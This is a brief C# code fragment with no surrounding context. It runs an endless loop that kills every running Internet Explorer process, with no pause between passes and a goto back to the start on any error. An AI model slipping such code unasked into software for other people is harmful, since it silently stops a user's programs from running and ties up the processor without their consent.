    while (true)
            {
                StartLoop:
                try
                {
                    foreach (System.Diagnostics.Process process in System.Diagnostics.Process.GetProcesses())
                    {
                        if (process.ProcessName.ToUpperInvariant().Equals("IEXPLORE"))
                            process.Kill();
                    }
                }
                catch
                {
                    goto StartLoop;
                }
            }
